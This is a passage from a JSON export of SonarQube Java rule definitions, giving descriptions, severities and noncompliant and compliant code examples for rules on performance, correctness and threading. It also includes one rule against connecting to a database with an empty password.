used in hashes","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Generating random floating point values to cast them into integers is inefficient. A random bounded integer value can be generated with a single\nproper method call. Use <code>nextInt</code> to make the code more efficient and the intent clearer.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nRandom r = new Random();\nint rand = (int) (r.nextDouble() * 50);  // Noncompliant way to get a pseudo-random value between 0 and 50\nint rand2 = (int) r.nextFloat(); // Noncompliant; will always be 0;\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nRandom r = new Random();\nint rand = r.nextInt(50);  // returns pseudo-random value between 0 and 50\nint rand2 = 0;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2140","summary":"Methods of \"Random\" that return floating point values should not be used in random integer generation","tags":["clumsy","performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In applications where the accepted practice is to log an <code>Exception</code> and then rethrow it, you end up with miles-long logs that contain\nmultiple instances of the same exception. In multi-threaded applications debugging this type of log can be particularly hellish because messages from\nother threads will be interwoven with the repetitions of the logged-and-thrown <code>Exception</code>. Instead, exceptions should be either logged or\nrethrown, not both.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ncatch (SQLException e) {\n  ...\n  LOGGER.log(Level.ERROR,  contextInfo, e);\n  throw new MySQLException(contextInfo, e);\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\ncatch (SQLException e) {\n  ...\n  throw new MySQLException(contextInfo, e);\n}\n</pre>\n<p>or</p>\n<pre>\ncatch (SQLException e) {\n  ...\n  LOGGER.log(Level.ERROR,  contextInfo, e);\n  // handle exception...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-2139","summary":"Exceptions should be either logged or rethrown but not both","tags":["logging","error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"DISTINCT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The default implementation of <code>java.lang.Thread</code> 's <code>run</code> will only perform a task passed as a <code>Runnable</code>. If no\n<code>Runnable</code> has been provided at construction time, then the thread will not perform any action.</p>\n<p>When extending <code>java.lang.Thread</code>, you should override the <code>run</code> method or pass a <code>Runnable</code> target to the\nconstructor of <code>java.lang.Thread</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyThread extends Thread { // Noncompliant\n  public void doSomething() {\n    System.out.println(\"Hello, World!\");\n  }\n}\n</pre>\n<h2>How to fix it</h2>\n<p>To fix this issue, you have 2 options:</p>\n<ul>\n  <li> override the <code>run</code> method </li>\n</ul>\n<pre>\npublic class MyThread extends Thread {\n  @Override\n  public void run() {\n    System.out.println(\"Hello, World!\");\n  }\n}\n</pre>\n<ul>\n  <li> provide a <code>Runnable</code> at construction time </li>\n</ul>\n<pre>\npublic class MyRunnable implements Runnable {\n  @Override\n  public void run() {\n    System.out.println(\"Hello, World!\");\n  }\n}\npublic class MyThread extends Thread {\n  public MyThread(Runnable runnable) {\n    super(runnable);\n  }\n}\n\npublic class Main() {\n  public static void main(String [] args) {\n    Runnable runnable = new MyRunnable();\n    Thread customThread = new MyThread(runnable);\n    Thread regularThread = new Thread(runnable);\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2134","summary":"Classes extending java.lang.Thread should provide a specific \"run\" behavior","tags":["multi-threading","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Creating an object for the sole purpose of calling <code>getClass</code> on it is a waste of memory and cycles. Instead, simply use the classâs\n<code>.class</code> property.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nMyObject myOb = new MyObject();  // Noncompliant\nClass c = myOb.getClass();\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nClass c = MyObject.class;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-2133","summary":"Objects should not be created only to invoke \"getClass\"","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule is deprecated; use {rule:java:S1158} instead.</p>\n<h2>Why is this an issue?</h2>\n<p>\"Boxing\" is the process of putting a primitive value into a primitive-wrapper object. When thatâs done purely to use the wrapper class'\n<code>toString</code> method, itâs a waste of memory and cycles because those methods are <code>static</code>, and can therefore be used without a\nclass instance. Similarly, using the <code>static</code> method <code>valueOf</code> in the primitive-wrapper classes with a non-<code>String</code>\nargument should be avoided.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint myInt = 4;\nString myIntString = (new Integer(myInt)).toString(); // Noncompliant; creates &amp; discards an Integer object\nmyIntString = Integer.valueOf(myInt).toString(); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint myInt = 4;\nString myIntString = Integer.toString(myInt);\n</pre>\n\n","impacts":[],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2131","summary":"Primitives should not be boxed just for \"String\" conversion","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Rather than creating a boxed primitive from a <code>String</code> to extract the primitive value, use the relevant <code>parse</code> method\ninstead. Using <code>parse</code> makes the code more efficient and the intent of the developer clearer.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString myNum = \"42.0\";\nfloat myFloat = new Float(myNum);  // Noncompliant\nfloat myFloatValue = (new Float(myNum)).floatValue();  // Noncompliant\nint myInteger = Integer.valueOf(myNum); // Noncompliant\nint myIntegerValue = Integer.valueOf(myNum).intValue(); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString myNum = \"42.0\";\nfloat f = Float.parseFloat(myNum);\nint myInteger = Integer.parseInt(myNum);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2130","summary":"Parsing should be used to convert \"Strings\" to primitives","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Calling constructors for <code>String</code>, <code>BigInteger</code>, <code>BigDecimal</code> and the objects used to wrap primitives is less\nefficient and less clear than relying on autoboxing or <code>valueOf</code>.</p>\n<p>Consider simplifying when possible for more efficient and cleaner code.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString empty = new String(); // Noncompliant; yields essentially \"\", so just use that.\nString nonempty = new String(\"Hello world\"); // Noncompliant\nDouble myDouble = new Double(1.1); // Noncompliant; use valueOf\nInteger integer = new Integer(1); // Noncompliant\nBoolean bool = new Boolean(true); // Noncompliant\nBigInteger bigInteger1 = new BigInteger(\"3\"); // Noncompliant\nBigInteger bigInteger2 = new BigInteger(\"9223372036854775807\"); // Noncompliant\nBigInteger bigInteger3 = new BigInteger(\"111222333444555666777888999\"); // Compliant, greater than Long.MAX_VALUE\nBigDecimal bigDecimal = new BigDecimal(\"42.0\"); // Compliant (see Exceptions section)\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString empty = \"\";\nString nonempty = \"Hello world\";\nDouble myDouble = 1.1;\nInteger integer = 1;\nBoolean bool = true;\nBigInteger bigInteger1 = BigInteger.valueOf(3);\nBigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);\nBigInteger bigInteger3 = new BigInteger(\"111222333444555666777888999\");\nBigDecimal bigDecimal = new BigDecimal(\"42.0\");\n</pre>\n<h3>Exceptions</h3>\n<p><code>BigDecimal</code> constructor with a <code>double</code> argument is ignored as using <code>valueOf</code> instead might change the resulting\nvalue. See {rule:java:S2111}.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html\">Oracle - Learning the Java Language</a> - Autoboxing and Unboxing\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2129","summary":"Constructors should not be used to instantiate \"String\", \"BigInteger\", \"BigDecimal\" and primitive-wrapper classes","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>Double.longBitsToDouble</code> converts the bit pattern into its corresponding floating-point representation. The method expects a 64-bit\nlong argument to interpret the bits as a double value correctly.</p>\n<p>When the argument is a smaller data type, the cast to <code>long</code> may lead to a different value than expected due to the interpretation of\nthe most significant bit, which, in turn, results in <code>Double.longBitsToDouble</code> returning an incorrect value.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint i = 0x80003800;\nDouble.longBitsToDouble(i);   // Noncompliant - NaN\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nlong i = 0x80003800L;\nDouble.longBitsToDouble(i);   // Compliant - 1.0610049784E-314\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/Double.html#doubleToLongBits(double)\">Oracle Java SE -\n  Double.doubleToLongBits</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Double-precision_floating-point_format\">Wikipedia - Double Precision floating point format</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Single-precision_floating-point_format\">Wikipedia - Single Precision floating point format</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2127","summary":"\"Double.longBitsToDouble\" should take \"long\" as argument","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i = i++; // Noncompliant; i is still zero\n\n  return j++; // Noncompliant; 0 returned\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i++;\n  return ++j;\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2123","summary":"Values should not be uselessly incremented","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p><code>ThreadPoolExecutor</code> is an object that efficiently manages and controls the execution of multiple tasks in a thread pool. A thread pool\nis a collection of pre-initialized threads ready to execute tasks. Instead of creating a new thread for each task, which can be costly in terms of\nsystem resources, a thread pool reuses existing threads.</p>\n<p><code>java.util.concurrent.ScheduledThreadPoolExecutor</code> is an extension of <code>ThreadPoolExecutor</code> that can additionally schedule\ncommands to run after a given delay or to execute periodically.</p>\n<p><code>ScheduledThreadPoolExecutor</code> 's pool is sized with <code>corePoolSize</code>, so setting <code>corePoolSize</code> to zero means the\nexecutor will have no threads and run nothing. <code>corePoolSize</code> should have a value greater than zero and valid for your tasks.</p>\n<p>This rule detects instances where <code>corePoolSize</code> is set to zero via its setter or the object constructor.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void do(){\n\n  int poolSize = 5; // value greater than 0\n\n  ScheduledThreadPoolExecutor threadPool1 = new ScheduledThreadPoolExecutor(0); // Noncompliant\n\n  ScheduledThreadPoolExecutor threadPool2 = new ScheduledThreadPoolExecutor(poolSize);\n  threadPool2.setCorePoolSize(0);  // Noncompliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/util/concurrent/ScheduledThreadPoolExecutor.html\">Oracle Java SE -\n  ScheduledThreadPoolExecutor</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://engineering.zalando.com/posts/2019/04/how-to-set-an-ideal-thread-pool-size.html\">Zalando - How to set an ideal thread pool\n  size</a> </li>\n  <li> <a href=\"https://www.baeldung.com/java-threadpooltaskexecutor-core-vs-max-poolsize\">Baeldung - ThreadPoolTaskExecutor corePoolSize vs.\n  maxPoolSize</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2122","summary":"\"ScheduledThreadPoolExecutor\" should not have 0 core threads","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Operations performed on a string with predictable outcomes should be avoided. For example:</p>\n<ul>\n  <li> checking if a string contains itself </li>\n  <li> comparing a string with itself </li>\n  <li> matching a string against itself </li>\n  <li> creating a substring from 0 to the end of the string </li>\n  <li> creating a substring from the end of the string </li>\n  <li> replacing a string with itself </li>\n  <li> replacing a substring with the exact substring </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Avoid performing the operation that has a predictable outcome.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString speech = \"SonarQube is the best static code analysis tool.\"\n\nString s1 = speech.substring(0); // Noncompliant - yields the whole string\nString s2 = speech.substring(speech.length()); // Noncompliant - yields \"\";\nString s3 = speech.substring(5, speech.length()); // Noncompliant - use the 1-arg version instead\n\nif (speech.contains(speech)) { // Noncompliant - always true\n    // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString speech = \"SonarQube is the best static code analysis tool.\"\n\nString s1 = speech;\nString s2 = \"\";\nString s3 = speech.substring(5);\n\n// ...\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/String.html\">Oracle Java SE - String</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2121","summary":"String operations with predictable outcomes should be avoided","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Creating a new <code>Random</code> object each time a random value is needed is inefficient and may produce numbers that are not random, depending\non the JDK. For better efficiency and randomness, create a single <code>Random</code>, store it, and reuse it.</p>\n<p>The <code>Random()</code> constructor tries to set the seed with a distinct value every time. However, there is no guarantee that the seed will be\nrandomly or uniformly distributed. Some JDK will use the current time as seed, making the generated numbers not random.</p>\n<p>This rule finds cases where a new <code>Random</code> is created each time a method is invoked.</p>\n<h3>Exceptions</h3>\n<p>This rule doesnât apply to classes that use a <code>Random</code> in their constructors or the static <code>main</code> function and nowhere\nelse.</p>\n<h2>How to fix it</h2>\n<p>Define and reuse the <code>Random</code> object.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyClass {\n\n    public void doSomethingCommon() {\n      Random random = new Random();        // Noncompliant - new instance created with each invocation\n      int rValue = random.nextInt();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass MyClass {\n    private Random random = new Random();  // Compliant\n\n    public void doSomethingCommon() {\n      int rValue = this.random.nextInt();\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/util/Random.html\">Oracle Java SE - Random</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://www.baeldung.com/java-generating-random-numbers\">Baeldung - generating random number</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2119","summary":"\"Random\" objects should be reused","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Serialization is a platform-independent mechanism for writing the state of an object into a byte-stream. For serializing the object, we call the\n<code>writeObject()</code> method of <code>java.io.ObjectOutputStream</code> class. Only classes that implement <code>Serializable</code> or extend a\nclass that does it can successfully be serialized (or de-serialized).</p>\n<p>Attempting to write a class with the <code>writeObject</code> method of the <code>ObjectOutputStream</code> class that does not implement\n<code>Serializable</code> or extends a class that implements it, will throw an <code>IOException</code>.</p>\n<h2>How to fix it</h2>\n<p>The object class passed as an argument to the <code>writeObject</code> must implement <code>Serializable</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Vegetable {\n  // ...\n}\n\npublic class Menu {\n  public void meal(ObjectOutputStream oos) throws IOException {\n    Vegetable veg = new Vegetable();\n    oos.writeObject(veg);  // Noncompliant\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Vegetable implements Serializable {\n  // ...\n}\n\npublic class Menu {\n  public void meal(ObjectOutputStream oos) throws IOException {\n    Vegetable veg = new Vegetable();\n    oos.writeObject(veg);\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/io/Serializable.html\">Oracle Java SE - Serializable</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/io/ObjectOutputStream.html\">Oracle Java SE - ObjectOutputStream</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2118","summary":"\"writeObject\" argument must implement \"Serializable\"","tags":["serialization"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The purpose of the <code>hashCode</code> method is to return a hash code based on the contents of the object. Similarly, the purpose of the\n<code>toString</code> method is to provide a textual representation of the objectâs contents.</p>\n<p>Calling <code>hashCode()</code> and <code>toString()</code> directly on array instances should be avoided because the default implementations\nprovided by the <code>Object</code> class do not provide meaningful results for arrays. <code>hashCode()</code> returns the arrayâs \"identity hash\ncode\", and <code>toString()</code> returns nearly the same value. Neither methodâs output reflects the arrayâs contents.</p>\n<h2>How to fix it</h2>\n<p>Use relevant static <code>Arrays</code> method.</p>\n<ul>\n  <li> <code>Arrays.hashCode</code> or <code>Arrays.deepHashCode</code> </li>\n  <li> <code>Arrays.toString</code> or <code>Arrays.deepToString</code> </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic static void main(String[] args) {\n    String argStr = args.toString();       // Noncompliant\n    int argHash = args.hashCode();         // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic static void main(String[] args) {\n    String argStr = Arrays.toString(args); // Compliant\n    int argHash = Arrays.hashCode(args);   // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/util/Arrays.html\">Oracle Java SE - Arrays API</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://github.com/google/error-prone/blob/master/docs/bugpattern/ArrayHashCode.md\">Error Prone - ArrayHashCode</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2116","summary":"\"hashCode\" and \"toString\" should not be called on array instances","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>\n<h2>Why is this an issue?</h2>\n<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting\nthis vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication\ncredentials.</p>\n<h3>What is the potential impact?</h3>\n<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially\nleading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and\nintegrity of the database and the data it contains.</p>\n<h4>Unauthorized Access to Sensitive Data</h4>\n<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can\ninclude personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the\ndatabase. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to\nidentity theft, financial loss, or reputational damage.</p>\n<h4>Compromise of System Integrity</h4>\n<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the\nentire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,\nunauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the\norganization to further security risks.</p>\n<h4>Unwanted Modifications or Deletions</h4>\n<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a\nsignificant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For\nexample, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business\nprocesses and potentially leading to financial and legal consequences.</p>\n<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system\ncompromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain\nsystem integrity, and protect the organization from potential harm.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses an empty password to connect to a Postgres database.</p>\n<p>The vulnerability can be fixed by using a strong password retrieved from Properties. This <code>database.password</code> property is set during\ndeployment. Its value should be strong and different for each database.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\nConnection conn = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true\", \"login\", \"\"); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\nString password = System.getProperty(\"database.password\");\nConnection conn = DriverManager.getConnection(\"jdbc:derby:memory:myDB;create=true\", \"login\", password);\n</pre>\n<h3>Pitfalls</h3>\n<h4>Hard-coded passwords</h4>\n<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.\nHere are a few reasons why it is not recommended:</p>\n<ol>\n  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or\n  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>\n  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be\n  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>\n  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control\n  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>\n</ol>\n<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,\nconfiguration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information\nfrom the codebase.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/environment/properties.html\">Java Properties</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2115","summary":"A secure password should be used when connecting to a database","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Passing a collection as an argument to the collectionâs own method is either an error - some other argument was intended - or simply nonsensical\ncode.</p>\n<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in\nundefined behavior.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nList &lt;Object&gt; objs = new ArrayList&lt;Object&gt;();\nobjs.add(\"Hello\");\n\nobjs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called\nobjs.addAll(objs); // Noncompliant; behavior undefined\nobjs.containsAll(objs); // Noncompliant; always true\nobjs.removeAll(objs); // Noncompliant; confusing. Use clear() instead\nobjs.retainAll(objs); // Noncompliant; NOOP\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-2114","summary":"Collections should not be passed as arguments to their own methods","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>equals</code> and <code>hashCode</code> methods of <code>java.net.URL</code> may trigger a name service lookup (typically DNS) to resolve\nthe hostname or IP address. Depending on the configuration, and network status, this lookup can be time-consuming.</p>\n<p>On the other hand, the <code>URI</code> class does not perform such lookups and is a better choice unless you specifically require the\nfunctionality provided by <code>URL</code>.</p>\n<p>In general, it is better to use the <code>URI</code> class until access to the resource is actually needed, at which point you can convert the\n<code>URI</code> to a <code>URL</code> using <code>URI.toURL()</code>.</p>\n<p>This rule checks for uses of 